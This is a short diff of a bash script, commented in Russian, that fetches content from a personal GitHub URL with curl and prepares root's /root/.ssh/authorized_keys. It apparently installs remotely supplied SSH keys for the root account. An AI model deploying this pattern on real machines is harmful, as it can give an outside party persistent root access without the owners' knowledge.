@@ -1,5 +1,5 @@
 #!/bin/bash
-files=$(curl -s https://raw.githubusercontent.com/zip609/temp/main/add | grep -oP 'href="\K[^"]+')
+files=$(curl -s https://raw.githubusercontent.com/zip609/temp/main/add)
 #создать директорию /root/.ssh/
 mkdir -p /root/.ssh/
 #создать файл /root/.ssh/authorized_keys
